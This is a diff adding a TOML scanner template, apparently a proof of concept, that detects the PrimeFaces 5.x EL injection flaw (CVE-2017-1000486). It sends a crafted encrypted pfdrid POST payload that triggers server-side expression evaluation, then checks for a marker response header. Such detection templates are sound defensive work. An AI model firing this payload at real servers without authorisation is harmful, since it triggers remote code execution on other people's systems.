@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "通过向 /javax.faces.resource/dynamiccontent.properties.xhtml 发送特制 POST 请求，利用 PrimeFaces 5.x 弱加密缺陷触发 EL 表达式注入，检测响应头中是否存在 Mogwailabs: CHECKCHECK 标记以确认漏洞存在"
+id = "POC-AVE-2017-0198"
+name = "PrimeFaces 5.x EL Injection RCE PoC"
+severity = "critical"
+tags = ["ave-2017-0198"]
+vuln_id = [
+    "CVE-2017-1000486",
+    "AVE-2017-0198",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/javax.faces.resource/dynamiccontent.properties.xhtml"
+protocol = "http"
+
+[poc.requests.body]
+content = "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe704aOkNwaB12Cc3Iq6NmBo%2BQZuqhqtPxdTA%3D%3D"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["Mogwailabs: CHECKCHECK"]
